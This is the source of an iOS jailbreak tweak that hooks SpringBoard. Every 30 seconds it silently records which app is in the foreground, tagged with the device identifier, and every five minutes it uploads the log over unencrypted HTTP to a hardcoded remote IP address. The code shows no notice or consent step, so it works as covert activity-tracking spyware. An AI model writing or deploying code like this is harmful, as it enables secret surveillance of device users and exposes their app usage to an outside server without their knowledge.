#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <SpringBoard/SpringBoard.h>
#import <os/log.h>

// Configuration
static NSString *API_ENDPOINT = @"http://186.190.215.38:3000/screenshots/log";
static NSString *DEVICE_ID = nil;
static NSMutableArray *systemLogs = nil;
static const NSInteger MAX_LOGS = 50;
static NSTimer *sendTimer = nil;
static os_log_t system_monitor_log = NULL;

// Declare interfaces
@interface SBApplication : NSObject
- (NSString *)bundleIdentifier;
@end

@interface SBApplicationController : NSObject
+ (id)sharedInstance;
- (SBApplication *)frontmostApplication;
@end

@interface SpringBoard (ScreenshotMonitor)
- (void)logSystemActivity;
- (void)sendLogsToServer;
- (NSString *)getCurrentApp;
@end

%hook SpringBoard

-(void)applicationDidFinishLaunching:(id)application {
    %orig;
    
    // Initialize os_log
    system_monitor_log = os_log_create("com.mateus.systemmonitor", "SystemMonitor");
    
    // Initialize logs array
    if (!systemLogs) {
        systemLogs = [NSMutableArray new];
    }
    
    // Get device ID if not set
    if (!DEVICE_ID) {
        DEVICE_ID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
    }
    
    // Start periodic logging (every 30 seconds)
    [NSTimer scheduledTimerWithTimeInterval:30.0
                                   target:self
                                 selector:@selector(logSystemActivity)
                                 userInfo:nil
                                  repeats:YES];
    
    // Start periodic sending to server (every 5 minutes)
    sendTimer = [NSTimer scheduledTimerWithTimeInterval:300.0
                                               target:self
                                             selector:@selector(sendLogsToServer)
                                             userInfo:nil
                                              repeats:YES];
    
    os_log(system_monitor_log, "[SystemMonitor] Initialized with endpoint: %@", API_ENDPOINT);
}

%new
-(NSString *)getCurrentApp {
    // Get the current active application
    SBApplicationController *appController = [%c(SBApplicationController) sharedInstance];
    SBApplication *frontApp = [appController frontmostApplication];
    return frontApp ? [frontApp bundleIdentifier] : @"unknown";
}

%new
-(void)logSystemActivity {
    // Create timestamp
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss.SSS'Z'"];
    [formatter setTimeZone:[NSTimeZone timeZoneWithName:@"UTC"]];
    NSString *timestamp = [formatter stringFromDate:[NSDate date]];
    
    // Get current app
    NSString *currentApp = [self getCurrentApp];
    
    // Create log entry
    NSDictionary *logEntry = @{
        @"deviceId": DEVICE_ID,
        @"timestamp": timestamp,
        @"log": currentApp
    };
    
    // Add to logs array
    [systemLogs insertObject:logEntry atIndex:0];
    
    // Keep only recent logs
    if (systemLogs.count > MAX_LOGS) {
        [systemLogs removeLastObject];
    }
    
    os_log(system_monitor_log, "[SystemMonitor] App logged at %@: %@", timestamp, currentApp);
}

%new
-(void)sendLogsToServer {
    if (systemLogs.count == 0) {
        return;
    }
    
    // Create JSON payload
    NSDictionary *payload = @{
        @"success": @YES,
        @"data": systemLogs
    };
    
    // Convert to JSON
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload
                                                     options:0
                                                       error:&error];
    
    if (error) {
        os_log_error(system_monitor_log, "[SystemMonitor] JSON conversion failed: %@", error.localizedDescription);
        return;
    }
    
    // Create request
    NSURL *url = [NSURL URLWithString:API_ENDPOINT];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:jsonData];
    
    // Send request
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request
                                                                completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            os_log_error(system_monitor_log, "[SystemMonitor] Network error: %@", error.localizedDescription);
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            if (httpResponse.statusCode == 200) {
                [systemLogs removeAllObjects];
                os_log(system_monitor_log, "[SystemMonitor] Successfully sent logs to server");
            } else {
                os_log_error(system_monitor_log, "[SystemMonitor] Server error: %ld", (long)httpResponse.statusCode);
            }
        }
    }];
    
    [task resume];
}

%end

// Required constructor
%ctor {
    NSLog(@"[SystemMonitor] Tweak loaded");
}